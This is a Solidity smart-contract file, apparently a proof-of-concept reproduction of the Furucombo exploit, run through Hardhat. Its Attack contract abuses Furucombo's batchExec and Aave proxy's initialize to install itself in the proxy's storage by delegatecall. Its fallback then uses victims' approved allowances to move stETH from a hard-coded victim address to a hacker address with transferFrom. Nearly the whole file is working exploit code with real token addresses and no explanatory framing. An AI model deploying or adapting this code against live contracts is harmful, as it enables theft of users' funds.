// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "./FurucomboProxy.sol";
import "hardhat/console.sol";

contract Attack {

    address payable owner;
    address aaveAddr;
    Proxy furucomboProxy;
    bool _installed = false;

    constructor (address payable _fcProxy, address _aave) public {
        owner = msg.sender;
        furucomboProxy = Proxy (_fcProxy);
        aaveAddr = _aave;
    }

    function installed () public {
        console.log("Inside ATK: Installed!");
    }

    function install () public {
        console.log("Inside ATK: install(START)");
        // Install the "Attack" contract in the FC storage, through the Aave proxy
        address[] memory aaveProxyAddr = new address[](1);
        bytes32[] memory dummyConfig = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);

        aaveProxyAddr[0] = aaveAddr;
        dummyConfig[0] = 0;

        // Once installed, Aave should delegatecall our `installed()` function
        bytes memory installedFunc = abi.encodeWithSignature("installed()");
        // Call Aave's `initialize` function with our custom arguments
        bytes memory payload = abi.encodeWithSignature("initialize(address,bytes)", address(this), installedFunc);
        datas[0] = payload;

        furucomboProxy.batchExec(aaveProxyAddr, dummyConfig, datas);
        console.log("Inside ATK: install(END)");
        _installed = true;
    }

    fallback () external payable {
        console.log("Attacker: Fallback called");
        console.log("FALLBACK: this.address = ", address(this));

        address stEthAddr = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
        address payable victim = 0x78Bc49be7bae5e0eeC08780c86F0e8278B8B035b;
        address payable hacker = 0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199;
        uint256 amount = 3943962136013873249416;
        
        // Get the allowance authorized by `victim` to `furucombo`
        uint256 allow = IERC20(stEthAddr).allowance(victim, address(this));
        console.log("Fallback: Allowance: ", allow);

        uint256 attackerBalance;
        attackerBalance = IERC20(stEthAddr).balanceOf(hacker);
        console.log("Fallback: Attacker balance in stETH before: ", attackerBalance);
        
        // "Unauthorized" transfer
        IERC20(stEthAddr).transferFrom(victim, hacker, amount);
        
        attackerBalance = IERC20(stEthAddr).balanceOf(hacker);
        console.log("Fallback: Attacker balance in stETH after: ", attackerBalance);
    }

    function exploit () public {
        require(_installed, "Attack contract not installed on FC. :(");
        
        address[] memory aaveProxyAddr = new address[](1);
        bytes32[] memory dummyConfig = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);

        aaveProxyAddr[0] = aaveAddr;
        dummyConfig[0] = 0;
        datas[0] = abi.encodeWithSignature("");

        // Just call Aave with dummy arguments so it fallbacks
        furucomboProxy.batchExec(aaveProxyAddr, dummyConfig, datas);
    }
}

// // Check if we correctly installed our Attacker contract
// // in the FC storage
// 
// function _implementation() public returns (address impl) {
//     bytes32 slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
//     assembly {
//         impl := sload(slot)
//     }
//     console.log(impl);
// }
